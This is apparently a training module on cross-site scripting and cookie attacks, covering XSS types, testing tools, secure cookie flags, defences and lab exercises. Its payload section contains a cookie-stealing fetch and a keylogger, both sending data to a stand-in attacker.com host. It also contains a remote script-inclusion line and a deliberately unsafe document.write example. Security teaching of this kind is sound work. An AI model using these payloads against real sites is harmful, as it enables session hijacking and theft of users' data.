# 🔥 Module 2: Cross-Site Scripting (XSS) and Cookie Attacks (Extended Version)

In this module, we explore client-side vulnerabilities, focusing on **Cross-Site Scripting (XSS)** and **cookie-based attacks**. These vulnerabilities abuse the trust between users and their browsers or applications, leading to session hijacking, data theft, and unauthorized actions.

---

## 🎯 Learning Objectives

By the end of this module, students will be able to:

- Define and identify the three main types of XSS
- Understand the consequences of executing JavaScript in a user's browser
- Test for XSS using both manual payloads and automated tools
- Understand the structure and use of cookies in web applications
- Identify insecure cookie configurations
- Demonstrate cookie theft and session hijacking
- Implement countermeasures for XSS and cookie-based attacks

---

## 🧠 What is XSS?

**Cross-Site Scripting (XSS)** allows attackers to inject **malicious scripts** (usually JavaScript) into web pages viewed by other users. If a site doesn't properly validate or encode user input, it may display it in a way that allows scripts to run in other users' browsers.

---

## 🎭 Types of XSS

### 1. **Reflected XSS**
- Injected code is reflected off the web server in the immediate response.
- Usually delivered via URL parameter or form input.
- Triggered when the user clicks on a crafted link.
- Example:
  ```
  https://example.com/search?q=<script>alert('XSS')</script>
  ```

### 2. **Stored XSS**
- The malicious script is permanently stored on the target server (e.g., in a database, forum post, user profile).
- Every time a victim accesses the page, the script executes.

### 3. **DOM-Based XSS**
- Happens entirely on the **client side**, manipulating the DOM (Document Object Model).
- Vulnerability is in JavaScript code that handles data from `document.URL`, `document.location`, etc.
- Example:
  ```javascript
  var user = location.hash.substring(1); 
  document.write("Hello " + user);
  ```

---

## 🧨 XSS Exploitation Techniques

### 🚨 Sample Payloads
- Simple alert test:
  ```html
  <script>alert('XSS')</script>
  ```
- Obfuscated variant:
  ```html
  <img src="x" onerror="alert('XSS')">
  ```

### 📦 Advanced Payloads
- Stealing cookies:
  ```javascript
  fetch('https://attacker.com?c=' + document.cookie)
  ```
- Keylogging:
  ```javascript
  document.onkeypress = function(e) { fetch('https://attacker.com/log?key=' + e.key); }
  ```

---

## 🔍 XSS Testing Methodology

### 🔧 Manual Testing
- Test all user inputs (forms, URLs, headers)
- Analyze responses for script injection points
- Use browser dev tools and proxy tools

### 🛠️ Tools for XSS Testing
- **Burp Suite** (manual or automated scanner)
- **ZAP** (XSS active scan rules)
- **XSS Hunter**: Payload hosting and callback service
- **DOM Invader** (part of Burp Suite Pro)

---

## 🛡️ Defending Against XSS

### ✅ Prevention Best Practices
- **Output Encoding**: Encode data before placing it in HTML, JavaScript, URLs, etc.
- **Context-aware encoding**: Use proper encoding for the output context (HTML, JS, Attribute, CSS).
- **Content Security Policy (CSP)**: Prevents execution of unauthorized scripts.
- **Sanitize Inputs**: Use libraries to strip harmful code (`DOMPurify`, `OWASP Java Encoder`).
- **Avoid `innerHTML`/`document.write`**: Use safe APIs (`textContent`, `createElement`).

---

## 🍪 Introduction to Cookies

Cookies are small pieces of data stored in the browser, often used to maintain sessions, preferences, or tokens.

### 📌 Cookie Anatomy
Example:
```
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

#### Key Attributes:
- **HttpOnly**: Prevents JavaScript access
- **Secure**: Transmits cookie only over HTTPS
- **SameSite**: Restricts cookie on cross-origin requests

---

## 💀 Cookie-Based Attacks

### 1. **Session Hijacking via XSS**
- Exploiting lack of `HttpOnly` to access and exfiltrate session cookies.

### 2. **Session Fixation**
- Forcing a user to authenticate using a known session ID.

### 3. **Cross-Site Script Inclusion**
- Using `<script src="attacker.com/malicious.js">` in XSS payloads to load full scripts.

---

## 🔍 Analyzing Cookie Security

### 🔧 Manual Inspection
- Use browser DevTools (Application > Cookies)
- Observe cookie flags and storage behavior

### 🛠️ Tools
- **Burp Suite** → Proxy → HTTP History
- **ZAP Cookie Scanner**
- `curl -I` to view headers directly

---

## 🛡️ Cookie Security Best Practices

- Always set `HttpOnly` and `Secure` flags
- Use `SameSite=Lax` or `Strict` for session cookies
- Use short-lived tokens and rotate session IDs on login
- Avoid storing sensitive data directly in cookies

---

## 🧪 Hands-On Exercises

1. **Reflected XSS**
   - Inject `?q=<script>alert('XSS')</script>` into a vulnerable search parameter
2. **Stored XSS**
   - Post a comment containing:
     ```html
     <img src=x onerror=alert('StoredXSS')>
     ```
3. **DOM-Based XSS**
   - Exploit a page using `document.location.hash` to run a payload
4. **Cookie Theft**
   - Inject script to steal `document.cookie`
5. **Set HttpOnly and Secure**
   - Modify application config and re-test cookie visibility from JavaScript

---

## 🧠 Summary

- XSS is a prevalent vulnerability that enables execution of arbitrary JavaScript in the user’s browser.
- Different forms of XSS (Reflected, Stored, DOM-based) exploit various weaknesses in web apps.
- Cookies, when not properly configured, are vulnerable to theft, manipulation, and misuse.
- Preventive measures include output encoding, CSP, and secure cookie flags.
- Hands-on testing is essential for understanding the real-world impact of these client-side flaws.

Next module: **Server-side vulnerabilities and risk profiling**